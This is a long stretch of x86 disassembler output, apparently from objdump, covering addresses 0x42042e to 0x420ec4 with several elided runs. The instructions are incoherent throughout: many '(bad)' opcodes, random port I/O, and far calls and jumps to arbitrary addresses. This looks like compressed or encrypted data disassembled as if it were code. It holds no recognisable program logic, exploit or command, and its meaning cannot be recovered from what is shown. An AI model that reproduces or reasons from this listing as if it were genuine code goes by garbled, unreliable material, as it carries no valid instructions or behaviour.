  42042e:	mov    BYTE PTR [eax+0x22e487cd],dh
  420434:	cmp    al,0x82
  420436:	and    edi,DWORD PTR [ecx-0x68]
  420439:	dec    ebp
  42043a:	inc    ebp
  42043b:	cld    
  42043c:	in     eax,dx
  42043d:	daa    
  42043e:	add    dl,ah
  420440:	jg     0x42048c
  420442:	add    ecx,DWORD PTR [ebp+0x249907e6]
  420448:	adc    ch,BYTE PTR [ebp+0xf987a8a]
  42044e:	stos   DWORD PTR es:[edi],eax
  42044f:	and    al,0x5
  420451:	sub    BYTE PTR ds:0x2dc050db,cl
  420457:	push   esi
  420458:	cld    
  420459:	or     ah,BYTE PTR [ebx]
  42045b:	cmp    eax,0xccbe0b7b
  420460:	es jo  0x4203e6
  420463:	loop   0x4203f2
  420465:	js     0x4204aa
  420467:	add    BYTE PTR [esi],0x1c
  42046a:	mov    al,ds:0xb4c7ee45
  42046f:	jnp    0x420477
  420471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420472:	xchg   edi,eax
  420473:	adc    al,BYTE PTR [ebp+0x2570ec90]
  420479:	push   edi
  42047a:	and    esi,DWORD PTR ss:[ecx]
  42047d:	js     0x420462
  42047f:	into   
  420480:	repnz rol BYTE PTR [edi+0x7824520f],1
  420487:	and    al,0x53
  420489:	pushf  
  42048a:	mov    DWORD PTR [eax-0x30363d62],0xc421e294
  420494:	in     eax,dx
  420495:	stc    
  420496:	mov    edi,0xaf15f27f
  42049b:	cmc    
  42049c:	retf   0xef6e
  42049f:	mov    ds,WORD PTR [edi+ebp*4-0x39]
  4204a3:	xor    ebx,DWORD PTR [ebx]
  4204a5:	call   0x56c0ce7b
  4204aa:	(bad)  
  4204ab:	mov    ds:0x8045ed98,eax
  4204b0:	fadd   QWORD PTR [edi+ebx*1+0x4b]
  4204b4:	pop    ds
  4204b5:	sub    eax,0xcc58d995
  4204ba:	xchg   edx,eax
  4204bb:	mov    bh,0x20
  4204bd:	lds    esp,FWORD PTR [esi+0x258c0745]
  4204c3:	mov    ebx,0x2ebbc5c4
  4204c8:	std    
  4204c9:	adc    eax,0x6e3f7226
  4204ce:	mov    ds:0x7882be4b,eax
  4204d3:	push   cs
  4204d4:	out    0x4a,al
  4204d6:	adc    al,0xd5
  4204d8:	test   eax,0xc101221f
  4204dd:	int3   
  4204de:	stos   DWORD PTR es:[edi],eax
  4204df:	xor    BYTE PTR [esi+0x62],dh
  4204e2:	mov    ds:0x34b3887c,eax
  4204e7:	xchg   ecx,eax
  4204e8:	pop    es
  4204e9:	and    eax,0x7457f9c7
	...
  420556:	scas   al,BYTE PTR es:[edi]
  420557:	xchg   esp,eax
  420558:	push   edi
  420559:	adc    bh,BYTE PTR [edi-0x2d]
  42055c:	out    dx,eax
  42055d:	mov    esp,0x5a7f6c39
  420562:	pusha  
  420563:	pop    eax
  420564:	sub    cl,BYTE PTR [edx+0x15b67]
  42056a:	add    BYTE PTR [ecx],al
  42056c:	add    BYTE PTR [eax],al
  42056e:	imul   ax,bx,0x5e70
  420573:	mov    ds:0xd3e75cb0,eax
  420578:	mov    dl,dh
  42057a:	sbb    ebp,DWORD PTR [ebp-0x6d442457]
  420580:	xchg   ecx,eax
  420581:	fndisi(8087 only) 
  420583:	test   BYTE PTR [edx],ch
  420585:	repz imul ecx,DWORD PTR [edi+0x73],0xdf1b77ee
  42058d:	mov    cl,0x7c
  42058f:	push   es
  420590:	retf   
  420591:	mov    dl,0x82
  420593:	mov    WORD PTR [esi],?
  420595:	xlat   BYTE PTR ds:[ebx]
  420596:	mov    ebp,0x34a3f411
  42059b:	fiadd  WORD PTR [ecx-0x2118a22d]
  4205a1:	sbb    esi,DWORD PTR [ecx+edi*8-0x51]
  4205a5:	clc    
  4205a6:	sub    DWORD PTR [esi-0x5186a05],esp
  4205ac:	rcl    BYTE PTR [esi-0x57],0x6b
  4205b0:	ins    BYTE PTR es:[edi],dx
  4205b1:	fs scas eax,DWORD PTR es:[edi]
  4205b3:	outs   dx,BYTE PTR ds:[esi]
  4205b4:	test   DWORD PTR [eax-0x77e5c179],edi
  4205ba:	repz fidivr DWORD PTR [ebx-0x5c]
  4205be:	lock sub BYTE PTR [esi],ah
  4205c1:	dec    ebx
  4205c2:	lds    ebx,FWORD PTR es:[edx-0x7e]
  4205c6:	popf   
  4205c7:	stos   DWORD PTR es:[edi],eax
  4205c8:	push   eax
  4205c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205ca:	xchg   ecx,eax
  4205cb:	shl    DWORD PTR [esi-0xe3b0aa5],cl
  4205d1:	jb     0x420619
  4205d3:	dec    esp
  4205d4:	dec    ebx
  4205d5:	jecxz  0x42059b
  4205d7:	sbb    eax,DWORD PTR [ebp+edx*8-0x3d]
  4205db:	cmc    
  4205dc:	inc    eax
  4205de:	mov    ?,WORD PTR [edx]
  4205e0:	in     eax,0x29
  4205e2:	adc    DWORD PTR [ebx-0x5a29f471],ebx
  4205e8:	mov    esp,0x1b1db26f
  4205ed:	les    edx,FWORD PTR [ebx-0x2b4ba337]
  4205f3:	push   ss
  4205f4:	mov    esi,0x462bcebc
  4205f9:	std    
  4205fa:	mov    al,0x8b
  4205fc:	test   eax,0x6340560c
  420601:	cmp    eax,0x5c39b453
  420606:	mov    ecx,0xac2734d2
  42060b:	sar    BYTE PTR ds:0xcc15c37,0x33
  420612:	rol    DWORD PTR [edx],cl
  420614:	push   eax
  420615:	gs ss adc dl,dl
  420619:	bound  ebp,QWORD PTR [ebp+0x41ba05d3]
  42061f:	push   ds
  420620:	dec    esi
  420621:	and    edi,DWORD PTR [ebp-0x39]
  420624:	fld    DWORD PTR [ecx+0x7d]
  420627:	fs cs sub edx,edx
  42062b:	mov    WORD PTR [ecx],?
  42062d:	xor    DWORD PTR [ebp+0x45],edi
  420630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420631:	sbb    al,0x48
  420633:	or     DWORD PTR [eax],edx
  420635:	(bad)  
  420636:	in     al,0x7
  420638:	sub    ah,BYTE PTR [ebx-0x1024ab7e]
  42063e:	push   edx
  42063f:	mov    esi,0x11d7c03f
  420644:	mov    esi,0x4398deb2
  420649:	add    esp,DWORD PTR [esi]
  42064b:	js     0x4206c3
  42064d:	mov    ah,0x31
  42064f:	or     BYTE PTR [ebp-0x69340682],ah
  420655:	je     0x42064c
  420657:	cmc    
  420658:	pusha  
  420659:	cs push esi
  42065b:	sub    BYTE PTR [ebp+esi*8-0x1d234f6],0x76
  420663:	mov    ?,WORD PTR [edi+0x17b90981]
  420669:	cmp    DWORD PTR [ecx+0x332626],0x0
	...
  4206d4:	add    BYTE PTR [eax],al
  4206d6:	test   BYTE PTR [eax-0x48],ch
  4206d9:	or     ah,bh
  4206db:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  4206e2:	and    DWORD PTR [ecx+eiz*1-0x54],ebp
  4206e6:	addr16 pop esp
  4206e8:	add    DWORD PTR [eax],eax
  4206ea:	add    BYTE PTR [ecx],al
  4206ec:	add    BYTE PTR [eax],al
  4206ee:	aas    
  4206ef:	mov    dl,0xd2
  4206f1:	mov    cl,0xf1
  4206f3:	out    0x4f,al
  4206f5:	push   0xffffff92
  4206f7:	test   BYTE PTR ds:0x467e0850,bl
  4206fd:	pop    ds
  4206fe:	add    ecx,DWORD PTR [ecx-0x83c0ea7]
  420704:	sub    al,0x76
  420706:	sti    
  420707:	xchg   edx,eax
  420708:	mov    al,ds:0x929ec47a
  42070d:	mov    esi,0x21cc2f10
  420712:	fsubr  DWORD PTR [eax]
  420714:	xor    ecx,DWORD PTR [ebp-0x5a]
  420717:	repnz inc ecx
  420719:	addr16 sub ebx,ebp
  42071c:	stc    
  42071d:	and    al,0x1c
  42071f:	fsub   st(7),st
  420721:	into   
  420722:	adc    al,0x15
  420724:	mov    dh,0xb7
  420726:	ret    0x73d9
  420729:	mov    DWORD PTR [ecx],0x6f84ef15
  42072f:	inc    ebp
  420730:	scas   al,BYTE PTR es:[edi]
  420731:	or     ch,BYTE PTR [eax]
  420733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420734:	addr16 xchg esp,eax
  420736:	lea    esp,[edi]
  420738:	ins    BYTE PTR es:[edi],dx
  420739:	jp     0x42075e
  42073b:	arpl   ax,bp
  42073d:	jle    0x42070c
  42073f:	push   ebx
  420740:	pusha  
  420741:	sti    
  420742:	fsubr  QWORD PTR ds:0x9d366ad2
  420748:	aad    0x1e
  42074a:	ins    BYTE PTR es:[edi],dx
  42074b:	cmc    
  42074c:	in     al,0xc0
  42074e:	and    bl,BYTE PTR [ebx+0x15]
  420751:	out    0xff,eax
  420753:	add    BYTE PTR [esi+0x56c9277],ch
  420759:	jmp    0x4207bd
  42075b:	add    esi,DWORD PTR [eax-0x71]
  42075e:	add    DWORD PTR [eax],esi
  420760:	sub    eax,DWORD PTR [esi-0x4b5873a1]
  420766:	jl     0x420797
  420768:	retf   0xf09f
  42076b:	aam    0x59
  42076d:	in     al,dx
  42076e:	arpl   bx,bx
  420770:	cmp    eax,0x867b63e3
  420775:	push   edi
  420776:	adc    ah,BYTE PTR [esi+0x2b]
  420779:	std    
  42077a:	outs   dx,DWORD PTR ds:[esi]
  42077b:	sub    al,0xc6
  42077d:	mov    fs,WORD PTR [esi]
  42077f:	les    ecx,FWORD PTR [eax]
  420781:	mov    bl,0x64
  420783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420784:	retf   
  420785:	das    
  420786:	outs   dx,DWORD PTR ds:[esi]
  420787:	sub    cl,cl
  420789:	clc    
  42078a:	sbb    eax,0xc5746bcf
  42078f:	inc    ebp
  420790:	add    edi,DWORD PTR [ebp-0x5dbf3ed3]
  420796:	repz mov dx,0xd2d2
  42079b:	ins    BYTE PTR es:[edi],dx
  42079c:	nop
  42079d:	call   0x4cb8:0xf3e43830
  4207a4:	xor    DWORD PTR [ebp-0x61],eax
  4207a7:	sbb    BYTE PTR [edi],0xef
  4207aa:	aas    
  4207ab:	call   0xfd23c1dc
  4207b0:	rcl    DWORD PTR [esi-0x42],1
  4207b3:	aad    0x2b
  4207b5:	jg     0x4207d1
  4207b7:	aad    0xd4
  4207b9:	xchg   edi,eax
  4207ba:	mov    ah,0x5a
  4207bc:	mov    ah,0xea
  4207be:	jns    0x4207f1
  4207c0:	retf   
  4207c1:	repnz cld 
  4207c3:	adc    cl,BYTE PTR [ebx+0x42]
  4207c6:	jge    0x420838
  4207c8:	dec    esi
  4207c9:	lahf   
  4207ca:	jno    0x420826
  4207cc:	jge    0x4207bd
  4207ce:	aad    0xc6
  4207d0:	fsubr  QWORD PTR [eax]
  4207d2:	rol    ebx,0x65
  4207d5:	xor    al,0x35
  4207d7:	fld    TBYTE PTR [edx]
  4207d9:	inc    esp
  4207da:	popf   
  4207db:	dec    eax
  4207dc:	cmp    DWORD PTR [eax],edx
  4207de:	stc    
  4207df:	scas   al,BYTE PTR es:[edi]
  4207e0:	cld    
  4207e1:	loope  0x420820
  4207e3:	or     al,ah
  4207e5:	shr    DWORD PTR [edx-0x19],cl
  4207e8:	sub    al,0x68
  4207ea:	popf   
  4207eb:	aam    0x38
  4207ed:	push   esp
	...
  420856:	mov    DWORD PTR [edi],ebp
  420858:	and    eax,0xad8aa780
  42085d:	das    
  42085e:	cmp    DWORD PTR [edi-0x24],ebp
  420861:	pusha  
  420862:	imul   edi
  420864:	sbb    al,0x66
  420866:	addr16 pop ebp
  420868:	add    DWORD PTR [eax],eax
  42086a:	add    BYTE PTR [ecx],al
  42086c:	add    BYTE PTR [eax],al
  42086e:	pop    es
  42086f:	jno    0x420862
  420871:	mov    eax,0x2fa4af57
  420876:	daa    
  420877:	add    eax,0xf3e01ab7
  42087c:	push   esp
  42087d:	xchg   bh,dh
  42087f:	bound  edx,QWORD PTR [ebx]
  420881:	push   ebp
  420882:	in     eax,0xf3
  420884:	pop    ebx
  420885:	xchg   eax,ecx
  420887:	jmp    0xc303195c
  42088c:	cmp    BYTE PTR [ecx],dl
  42088e:	(bad)  
  42088f:	add    al,0xfa
  420891:	mov    cl,0x8f
  420893:	xchg   ebx,eax
  420894:	call   0xcd927230
  420899:	ss jle 0x4208b2
  42089c:	mov    edi,0x1d09e796
  4208a1:	sub    DWORD PTR [ebx+0xf],edx
  4208a4:	xor    ah,BYTE PTR [ebx]
  4208a6:	inc    edx
  4208a7:	pop    edx
  4208a8:	push   ebp
  4208a9:	dec    edi
  4208aa:	push   es
  4208ab:	inc    esp
  4208ac:	fld    TBYTE PTR [esi+eax*4-0x53]
  4208b0:	xlat   BYTE PTR ds:[ebx]
  4208b1:	scas   al,BYTE PTR es:[edi]
  4208b2:	cmp    eax,0x6de79a43
  4208b7:	mov    ebx,0x6c6d1899
  4208bc:	call   DWORD PTR [ecx+0x31]
  4208bf:	(bad)  
  4208c1:	(bad)
  4208c4:	cmp    esp,DWORD PTR [ebp+0x54]
  4208c7:	mov    bl,0xe6
  4208c9:	ret    0x667e
  4208cc:	in     eax,0x70
  4208ce:	cmp    ebp,DWORD PTR [ebx+0x49]
  4208d1:	dec    eax
  4208d2:	cs loopne 0x420903
  4208d5:	imul   edi,DWORD PTR [edi],0xffffffda
  4208d8:	dec    esp
  4208d9:	jg     0x4208d2
  4208db:	jb     0x42093b
  4208dd:	inc    ebx
  4208de:	ins    DWORD PTR es:[edi],dx
  4208df:	jg     0x42095b
  4208e1:	xor    bh,al
  4208e3:	repz sub al,0xb
  4208e6:	adc    DWORD PTR [esi+0x3d4c5344],eax
  4208ec:	call   0x7abb:0x359d32cd
  4208f3:	add    eax,0x2e11d68d
  4208f8:	aad    0xb8
  4208fa:	fsub   DWORD PTR [edi+0xfbc25f6]
  420900:	imul   ecx,DWORD PTR [esi],0xa693e7c0
  420906:	fimul  WORD PTR [ebp+0x34e3f737]
  42090c:	in     al,0x27
  42090e:	retf   0x38a6
  420911:	int    0x20
  420913:	shl    BYTE PTR [ecx],cl
  420915:	dec    esi
  420916:	dec    ecx
  420917:	or     DWORD PTR [ecx],edx
  420919:	adc    ebx,DWORD PTR ds:0xe111dab4
  42091f:	js     0x4208d7
  420921:	dec    esp
  420922:	in     eax,0xc1
  420924:	xor    esi,esi
  420926:	or     esp,DWORD PTR [edi+ebp*1+0x79]
  42092a:	xor    al,0x58
  42092c:	xor    DWORD PTR [edx],ebx
  42092e:	ins    DWORD PTR es:[edi],dx
  42092f:	(bad)  
  420931:	fwait
  420932:	mov    dl,0x2a
  420934:	push   cs
  420935:	push   0x87a26aad
  42093a:	jns    0x420968
  42093c:	scas   eax,DWORD PTR es:[edi]
  42093d:	ja     0x42092f
  42093f:	add    eax,0xf2a02ebd
  420944:	xchg   ebp,eax
  420945:	(bad)  
  420946:	lock xor BYTE PTR [ebx-0x79],ah
  42094a:	adc    al,dh
  42094c:	inc    eax
  42094d:	inc    edi
  42094e:	(bad)  
  42094f:	ret    
  420950:	xchg   esi,eax
  420951:	jmp    0x420924
  420953:	sbb    eax,0xc476a3d2
  420958:	test   ebp,esi
  42095a:	jb     0x4209a1
  42095c:	mov    ch,0x70
  42095e:	dec    esi
  42095f:	fist   WORD PTR es:[ecx+0x6900fe82]
  420966:	dec    esi
  420967:	mov    bh,0xdc
  420969:	add    eax,0x2861481e
	...
  4209d6:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0x9
  4209e3:	xchg   ebx,eax
  4209e4:	fisttp DWORD PTR [edi+eiz*2+0x15e]
  4209eb:	add    DWORD PTR [eax],eax
  4209ed:	add    BYTE PTR [ebx+0x14],cl
  4209f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209f1:	lds    eax,FWORD PTR [ebp+0x2650c7e1]
  4209f7:	mov    dh,0xee
  4209f9:	out    dx,eax
  4209fa:	mov    esi,0xeb211bd9
  4209ff:	jo     0x420a1a
  420a01:	jb     0x4209bd
  420a03:	pop    es
  420a04:	mov    BYTE PTR [ecx-0x2c],cl
  420a07:	cmp    bh,BYTE PTR [edx-0x4338362b]
  420a0d:	iret   
  420a0e:	xchg   DWORD PTR ds:[edi+esi*8+0x5b],edi
  420a13:	clc    
  420a14:	pop    edx
  420a15:	int    0x30
  420a17:	shl    BYTE PTR [ebx+0x11],1
  420a1a:	rol    BYTE PTR [edx],cl
  420a1c:	retf   0x7199
  420a1f:	fimul  WORD PTR [edx-0x1d2a32b4]
  420a25:	mov    bl,ch
  420a27:	shr    BYTE PTR [edx+0x133ca25c],cl
  420a2d:	popf   
  420a2e:	fcom   st(3)
  420a30:	out    0x42,eax
  420a32:	adc    esp,eax
  420a34:	out    dx,al
  420a35:	bound  edi,QWORD PTR [esi]
  420a37:	pop    esi
  420a38:	fs out 0x9d,al
  420a3b:	cmp    ch,BYTE PTR [ebx]
  420a3d:	loopne 0x420a16
  420a3f:	and    al,BYTE PTR ss:[edx+0x42]
  420a43:	adc    DWORD PTR [edx+0x6c],ebp
  420a46:	jmp    0x420a5c
  420a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a49:	sub    ebp,DWORD PTR ds:0xa0d4a42f
  420a4f:	jge    0x4209d9
  420a51:	push   cs
  420a52:	retf   0xc1a
  420a55:	js     0x420a01
  420a57:	lock xor dl,BYTE PTR [ecx+0x669fab]
  420a5e:	and    ecx,ebp
  420a60:	ja     0x420a0b
  420a62:	out    0x82,eax
  420a64:	out    0x97,eax
  420a66:	sub    esp,DWORD PTR gs:[eax+0x42]
  420a6a:	dec    edx
  420a6b:	xlat   BYTE PTR ds:[ebx]
  420a6c:	iret   
  420a6d:	pusha  
  420a6e:	mov    ds,WORD PTR [esi-0x4250470f]
  420a74:	xor    al,0xa1
  420a76:	push   edx
  420a77:	cld    
  420a78:	mov    ebx,0x8476c58e
  420a7d:	push   ebp
  420a7e:	mov    ebx,0x11b4b8bf
  420a83:	ins    BYTE PTR es:[edi],dx
  420a84:	lahf   
  420a85:	stos   DWORD PTR es:[edi],eax
  420a86:	push   esi
  420a87:	xor    eax,0x8f907c32
  420a8c:	jnp    0x420a77
  420a8e:	jo     0x420ae4
  420a90:	jg     0x420a87
  420a92:	(bad)  
  420a93:	pop    eax
  420a94:	inc    esp
  420a95:	lods   eax,DWORD PTR ds:[esi]
  420a96:	sbb    al,0xa2
  420a98:	in     eax,0xfe
  420a9a:	fldcw  WORD PTR [edi]
  420a9c:	cdq    
  420a9d:	dec    eax
  420a9e:	and    al,0xa7
  420aa0:	ins    DWORD PTR es:[edi],dx
  420aa1:	pop    ecx
  420aa2:	mov    BYTE PTR [ecx+eiz*8],al
  420aa5:	aaa    
  420aa6:	outs   dx,BYTE PTR ds:[esi]
  420aa7:	pop    edx
  420aa8:	cmp    DWORD PTR [edx-0x366e97bc],ebp
  420aae:	or     dl,0x34
  420ab1:	inc    edx
  420ab2:	sub    edx,DWORD PTR [eax+0x5b]
  420ab5:	sbb    DWORD PTR [edx],edi
  420ab7:	jnp    0x420ab1
  420ab9:	stos   DWORD PTR es:[edi],eax
  420aba:	inc    ebx
  420abb:	lock mov ebx,DWORD PTR [edi]
  420abe:	push   edi
  420abf:	ret    
  420ac0:	imul   esp,esi,0xdeb7f54a
  420ac6:	ret    0x2370
  420ac9:	mov    cl,0xba
  420acb:	ja     0x420b47
  420acd:	or     DWORD PTR [ebx-0x7f],0x32
  420ad1:	ds inc edx
  420ad3:	(bad)  [eax-0x68775e4a]
  420ad9:	mov    eax,ds:0x5b4b431a
  420ade:	mov    edi,0x5cdc4396
  420ae3:	adc    eax,0x829bb2db
  420ae8:	cwde   
  420ae9:	push   ebx
  420aea:	je     0x420ad9
  420aec:	sbb    edi,DWORD PTR [esi+0x0]
	...
  420b53:	add    BYTE PTR [eax],al
  420b55:	add    bh,bl
  420b57:	xor    ch,BYTE PTR [edi-0x6010ed]
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	cwde   
  420b63:	push   ebp
  420b64:	dec    edi
  420b65:	outs   dx,DWORD PTR ds:[esi]
  420b66:	addr16 pop edi
  420b68:	add    DWORD PTR [eax],eax
  420b6a:	add    BYTE PTR [ecx],al
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	xchg   ebx,eax
  420b6f:	push   ebp
  420b70:	cmp    BYTE PTR [ebx+0x59c7770e],ch
  420b76:	ins    BYTE PTR es:[edi],dx
  420b77:	push   cs
  420b78:	test   BYTE PTR [ecx+0x76],ch
  420b7b:	iretw  
  420b7d:	repnz mov al,ds:0xd193ba52
  420b83:	xlat   BYTE PTR ds:[ebx]
  420b84:	call   0x644d:0xdf1867a6
  420b8b:	test   DWORD PTR [ebp+0x41],0x2134c2c7
  420b92:	mov    cl,0x7f
  420b94:	or     DWORD PTR [esi-0x8],esi
  420b97:	pop    edx
  420b98:	adc    bl,BYTE PTR [ebx+edx*8-0x7d]
  420b9c:	mov    eax,ds:0x99fa5a42
  420ba1:	icebp  
  420ba2:	leave  
  420ba3:	mov    esi,0xcedfa556
  420ba8:	(bad)  
  420ba9:	clc    
  420baa:	test   BYTE PTR [edi+edi*4+0x74],ah
  420bae:	dec    edi
  420baf:	clc    
  420bb0:	push   edi
  420bb1:	xchg   esi,eax
  420bb2:	cmp    al,0xe2
  420bb4:	lahf   
  420bb5:	jp     0x420b5b
  420bb7:	sub    al,0xc5
  420bb9:	jmp    0xd7742b5d
  420bbe:	arpl   WORD PTR ds:0x9a200926,bp
  420bc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bc5:	out    dx,al
  420bc6:	push   esp
  420bc7:	and    al,0x82
  420bc9:	inc    ebp
  420bca:	mov    cl,0x7d
  420bcc:	mov    esp,0xde0c3542
  420bd1:	leave  
  420bd2:	dec    ebx
  420bd3:	out    dx,al
  420bd4:	or     BYTE PTR [edx+eiz*8-0x17],0x59
  420bd9:	push   edi
  420bda:	jnp    0x420b89
  420bdc:	push   esp
  420bdd:	adc    BYTE PTR [esi],0x71
  420be0:	mov    eax,ds:0x5dab6be0
  420be5:	push   cs
  420be6:	out    0xd2,eax
  420be8:	jns    0x420be9
  420bea:	ficom  WORD PTR [ecx+0x48958caf]
  420bf0:	jge    0x420b81
  420bf2:	mov    edi,0xd72006bd
  420bf7:	mov    ecx,0xb7a09823
  420bfc:	popf   
  420bfd:	rsqrtps xmm5,xmm7
  420c00:	mov    fs,WORD PTR [esi+0x3537fd03]
  420c06:	and    al,0xfe
  420c08:	xlat   BYTE PTR ds:[ebx]
  420c09:	cmp    BYTE PTR ds:0x15e4930a,0x21
  420c10:	jno    0x420c44
  420c12:	(bad)  
  420c14:	inc    esi
  420c15:	or     BYTE PTR [ebx+0x43b52baf],ch
  420c1b:	pop    edi
  420c1c:	scas   eax,DWORD PTR es:[edi]
  420c1d:	ret    
  420c1e:	jae    0x420c70
  420c20:	mov    ebx,0x94b2a559
  420c25:	(bad)  
  420c26:	pop    ecx
  420c27:	cmp    eax,0xb01040ee
  420c2c:	es adc eax,0x7d504686
  420c32:	push   eax
  420c33:	pop    ds
  420c34:	fstp   TBYTE PTR [ecx-0x30]
  420c37:	js     0x420bc0
  420c39:	sub    DWORD PTR cs:0xd63010f9,0x74d2837c
  420c44:	mov    ecx,0xc41ad098
  420c49:	lds    ebx,FWORD PTR [eax-0x6f0b1a9f]
  420c4f:	cmp    al,0x76
  420c51:	fcomp  QWORD PTR [esi-0x6eace97]
  420c57:	stos   BYTE PTR es:[edi],al
  420c58:	pusha  
  420c59:	test   eax,0xc547eb1d
  420c5e:	addr16 je 0x420c97
  420c61:	adc    DWORD PTR [ebp-0xe7859e4],edx
  420c67:	inc    edx
  420c68:	jnp    0x420c72
  420c6a:	mov    dh,cl
  420c6c:	dec    ebp
  420c6d:	pop    eax
	...
  420cd6:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420cdc:	mov    edx,0x1886e3f
  420ce1:	in     eax,0xf6
  420ce3:	pop    ss
  420ce4:	test   eax,0x1606769
  420ce9:	add    BYTE PTR [eax],al
  420ceb:	add    DWORD PTR [eax],eax
  420ced:	add    cl,bh
  420cef:	cmp    al,0xdc
  420cf1:	ror    DWORD PTR [esi+0x2],0x2b
  420cf5:	rol    BYTE PTR [ebp-0x8f3ee7],cl
  420cfb:	jne    0x420ccd
  420cfd:	das    
  420cfe:	xchg   esp,eax
  420cff:	jns    0x420cd6
  420d01:	sub    esp,ebp
  420d03:	ja     0x420ccc
  420d05:	cmp    ebp,0x54
  420d08:	sar    BYTE PTR [ebx+eax*2],cl
  420d0b:	dec    ebx
  420d0c:	push   ecx
  420d0d:	jno    0x420cfa
  420d0f:	test   ebx,ebx
  420d11:	add    BYTE PTR [eax-0x2f9c8d1f],dh
  420d17:	loope  0x420d7e
  420d19:	test   al,0xa
  420d1b:	mov    ch,0x1c
  420d1d:	sub    al,0x63
  420d1f:	outs   dx,DWORD PTR ds:[esi]
  420d20:	mov    ecx,cs
  420d22:	shl    DWORD PTR [ebx-0x4b],cl
  420d25:	into   
  420d26:	mov    DWORD PTR [eax+0x1a],esp
  420d29:	ins    DWORD PTR es:[edi],dx
  420d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d2b:	not    BYTE PTR [esi]
  420d2d:	outs   dx,BYTE PTR ds:[esi]
  420d2e:	jne    0x420d9b
  420d30:	xor    DWORD PTR [ebp+0x19],edx
  420d33:	fst    QWORD PTR [esi]
  420d35:	push   cs
  420d36:	stos   DWORD PTR es:[edi],eax
  420d37:	mov    ds:0xbc3e77be,eax
  420d3c:	ror    DWORD PTR [eax-0x324c6cc0],cl
  420d42:	push   ebx
  420d43:	dec    edi
  420d44:	and    edx,DWORD PTR [ebp+0x28]
  420d47:	jl     0x420d38
  420d49:	test   DWORD PTR [edx+0x6ce957bd],0xd048142f
  420d53:	je     0x420d1d
  420d55:	mov    ebx,0xc4d6b361
  420d5a:	ds xchg esi,eax
  420d5c:	mov    edx,0xfe70f04b
  420d61:	sub    ebp,DWORD PTR [edx+esi*2-0x1d]
  420d65:	ficomp DWORD PTR [edx]
  420d67:	adc    edx,eax
  420d69:	stc    
  420d6a:	or     eax,0xfe785100
  420d6f:	ret    0xe3e7
  420d72:	jmp    0x420daa
  420d74:	popa   
  420d75:	adc    al,0x3e
  420d77:	cmp    eax,0xb8bf4e69
  420d7c:	jge    0x420d0c
  420d7e:	mov    BYTE PTR ds:0x17f95505,al
  420d84:	cmp    edi,esi
  420d86:	inc    ebp
  420d87:	jo     0x420de7
  420d89:	adc    edx,esi
  420d8b:	adc    al,ch
  420d8d:	stos   BYTE PTR es:[edi],al
  420d8e:	jns    0x420d6b
  420d90:	and    DWORD PTR [esi-0x35e4bcfe],ebp
  420d96:	and    ebp,ecx
  420d98:	push   ecx
  420d99:	fstp   TBYTE PTR [edx+eax*4+0x705f5167]
  420da0:	and    bl,cl
  420da2:	sahf   
  420da3:	test   eax,0xd44d9ce4
  420da8:	retf   0x2fa
  420dab:	lods   eax,DWORD PTR ds:[esi]
  420dac:	mov    esi,DWORD PTR [ebx-0x49]
  420daf:	ds inc ecx
  420db1:	mov    cl,BYTE PTR [ecx-0x5d32c25d]
  420db7:	popf   
  420db8:	ror    BYTE PTR [eax],1
  420dba:	jmp    0x420df0
  420dbc:	cmp    eax,0xb5f57ca7
  420dc1:	sbb    al,0x87
  420dc3:	dec    esp
  420dc4:	mov    eax,0x5dd57376
  420dc9:	cwde   
  420dca:	cmp    DWORD PTR [ebp+0x4335251a],esp
  420dd0:	ja     0x420d86
  420dd2:	jns    0x420dab
  420dd4:	pusha  
  420dd5:	arpl   WORD PTR [ecx-0x70258909],ax
  420ddb:	or     bl,BYTE PTR [ebp+0x6ff98614]
  420de1:	aam    0xb2
  420de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420de4:	pop    ds
  420de5:	mov    edi,0x80cec25e
  420dea:	cmp    BYTE PTR [ecx+0xb8ff],0x0
	...
  420e55:	add    bh,ah
  420e57:	push   ds
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0xed128f43
  420e66:	addr16 popa 
  420e68:	add    DWORD PTR [eax],eax
  420e6a:	add    BYTE PTR [ecx],al
  420e6c:	add    BYTE PTR [eax],al
  420e6e:	retf   
  420e6f:	das    
  420e70:	cmp    edi,esp
  420e72:	jmp    0xbf10:0xcd2b1837
  420e79:	fdivp  st(5),st
  420e7b:	mov    edi,0x6eddbff4
  420e80:	add    eax,0x5e297366
  420e85:	stos   BYTE PTR es:[edi],al
  420e86:	shl    DWORD PTR [edx-0x5f],cl
  420e89:	adc    ah,BYTE PTR ds:0x7ac7ac21
  420e8f:	mov    gs,WORD PTR [ecx]
  420e91:	add    ah,cl
  420e93:	test   ebp,esi
  420e95:	outs   dx,DWORD PTR ds:[esi]
  420e96:	mov    edx,0x2e09df5e
  420e9b:	adc    ch,0xa8
  420e9e:	ret    0x534d
  420ea1:	push   ebx
  420ea2:	or     BYTE PTR [esi-0x4d],bl
  420ea5:	jmp    0xf59d2172
  420eaa:	cmp    BYTE PTR [edx+0x77],ch
  420ead:	jle    0x420ea1
  420eaf:	and    dh,BYTE PTR [edi]
  420eb1:	retf   0x1a0b
  420eb4:	inc    ebx
  420eb5:	mov    ecx,0xc9fe11c0
  420eba:	lods   al,BYTE PTR ds:[esi]
  420ebb:	(bad)  
  420ebd:	ror    BYTE PTR [ebx],cl
  420ebf:	pop    ss
  420ec0:	dec    edx
  420ec1:	mov    ecx,DWORD PTR [edi]
  420ec3:	xchg   ebp,eax
  420ec4:	pop    edx
